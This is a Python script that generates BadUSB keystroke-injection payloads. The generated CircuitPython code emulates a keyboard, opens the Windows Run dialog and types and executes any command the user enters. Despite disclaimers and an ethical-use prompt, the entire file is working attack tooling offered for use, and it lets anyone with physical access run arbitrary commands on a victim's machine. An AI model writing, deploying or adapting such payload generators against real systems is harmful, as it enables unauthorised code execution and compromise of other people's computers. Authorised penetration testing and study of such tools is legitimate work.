# The Ram - BadUSB Payload Generator
# Created for educational and ethical hacking use only.
# --------------------------------------------
# DISCLAIMER: This tool is intended for legal and ethical purposes only.
# Ensure you have proper authorization before using this script.

import time
import os

def create_payload(payload_name, payload_command, delay=3):
    """
    Creates a BadUSB payload script.

    Args:
        payload_name (str): The name of the payload file.
        payload_command (str): The command to execute.
        delay (int): Delay in seconds before execution (default is 3 seconds).
    """
    if not payload_name.isidentifier():
        raise ValueError("Payload name must be a valid identifier (alphanumeric and underscores).")

    code = f'''
import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)

time.sleep({delay})
kbd.press(Keycode.WINDOWS, Keycode.R)
kbd.release_all()
time.sleep(1)
layout.write("{payload_command}")
kbd.press(Keycode.ENTER)
kbd.release_all()
'''

    try:
        folder = "generated_payloads"
        os.makedirs(folder, exist_ok=True)
        path = os.path.join(folder, f"{payload_name}.py")
        with open(path, "w") as f:
            f.write(code.strip())
        print(f"[+] Payload saved to {path}")
    except Exception as e:
        print(f"[-] Error creating payload: {e}")


if __name__ == "__main__":
    print("=== BadUSB Payload Generator ===")
    print("DISCLAIMER: Use this tool responsibly and only with proper authorization.")
    
    confirmation = input("Do you agree to use this tool ethically? (yes/no): ").strip().lower()
    if confirmation != "yes":
        print("Exiting... You must agree to use this tool ethically.")
    else:
        try:
            name = input("Payload name (alphanumeric and underscores only): ").strip()
            command = input("Command to execute: ").strip()
            delay = input("Delay before execution (default is 3 seconds): ").strip()
            
            # Validate delay
            delay = int(delay) if delay.isdigit() else 3
            
            create_payload(name, command, delay)
        except ValueError as ve:
            print(f"[-] Input error: {ve}")
        except Exception as e:
            print(f"[-] Unexpected error: {e}")

# The Ram - End of File